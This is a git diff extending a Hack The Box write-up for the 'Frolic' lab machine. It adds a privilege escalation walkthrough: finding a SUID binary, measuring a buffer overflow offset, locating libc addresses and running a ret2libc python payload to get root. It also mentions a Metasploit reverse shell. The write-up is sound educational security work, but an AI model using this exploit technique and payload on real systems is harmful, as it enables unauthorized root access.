@@ -1,4 +1,9 @@
 # FROLIC
+## Info
+
+IP Address: 10.10.10.111
+OS: Linux
+Difficulty: Medium
 
 ## NMAP
 ![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicnmap.png "NMAP")
@@ -105,3 +110,42 @@ Using metasploit, I was able to gain a reverse shell through playsms service
 
 Finally got user
 `user.txt = 2ab95909cf509f85a6f476b59a0c2fe0`
+
+## Privilege Escalation
+
+Following simple steps to check for escalation, I first check for SUID binaries in the system which can be exploited to escalate privileges:
+<image = ropfound>
+
+Finding `rop` means we can exploit it using ret2lib attack and gain root. Downloaded the binary to my local machine(by using the `download <file>` command in meterpreter) to debug it using gdb-peda.
+
+### Using gdb-peda
+Step 1: Creating a pattern of 100 characters
+      `pattern_create 100`
+      `AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL`
+Step 2: Finding buffer limit using pattern offset.
+<image = limitfound>
+
+### Using libc-search
+
+Step 1: Use `ldd rop` to find what library its using
+Step 2: Add gcc library to $PATH, using `export PATH = /usr/lib/gcc/i686-linux-gnu/:/sbin:/bin:/usr/sbin:/usr/bin`
+Step 3: Upload libc-search.c to server (https://0xdeadbeef.info/code/libc-search.c)
+Step 4: `gcc libc-search.c -o libc-search -lc -ldl`
+Step 5: Search for system, exit using -s 
+Step 6: Search for /bin/sh using -p (set libbase using -b)
+
+### Creating Payload
+The addresses are converted to little endian.
+<image = frolicadd>
+Now, we simply create a python one-line payload to pass as our argument to the `rop` binary.
+```
+python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"'
+```
+### Root Obtained
+
+Running
+```
+./rop $(python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"')
+```
+We obtain root
+<image = root obtained>
